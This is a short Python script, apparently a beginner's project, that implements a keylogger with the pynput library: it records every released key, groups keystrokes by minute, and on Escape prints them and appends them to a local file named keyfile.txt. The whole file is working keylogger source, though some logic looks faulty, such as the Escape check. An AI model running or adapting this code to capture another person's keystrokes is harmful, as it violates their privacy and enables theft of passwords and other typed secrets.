import time
from pynput import *
from pynput.keyboard import *

def outing_to_file(character):
    """Wrigting to a file the logs"""
    with open("keyfile.txt", 'a') as logkey:
        for i in character:
            for j in i:
                char = f"{j}\n{i[j]}\n"
                logkey.write(char)

def get_time():
    """Get The time by Minutes"""
    current_time_tuple = time.gmtime()
    formatted_time = time.strftime("%Y-%m-%d %H:%M", current_time_tuple)
    return formatted_time

def long_str(key):
    """Makes a long str to chek the last characters"""
    global str_l
    if hasattr(key, 'char') and key.char:
        str_l += key.char

def making_dict(key):
    """Making The directory fo the log"""
    global log_l
    now_time = get_time()
    if f"{now_time}" in log_l:
        log_l[f"{now_time}"].append(key)
    else:
        log_l[f"{now_time}"] = [key]

def key_for_log(key):
    """Loging Every key to all the function needed"""
    global log_l, str_l, global_log
    long_str(key)
    making_dict(key)
    if str_l[-4:] == "exit":
        print("Detected 'exit' key:", list(str_l))
        str_l = ""
    elif key == Key.space:
        global_log.append(log_l)
        log_l = {}
    elif key == Key.esc and Key.down:
        global_log.append(log_l)
        for i in global_log:
            for j in i:
                print(f"{j}\n{i[j]} ")
        outing_to_file(global_log)
        return False

def starting_listening():
    """Start listening"""
    global log_l, str_l
    log_l = {}
    str_l = ""
    with keyboard.Listener(on_release= key_for_log) as listener:
        listener.join()

global_log = []
log_l = {}
str_l = ""
starting_listening()
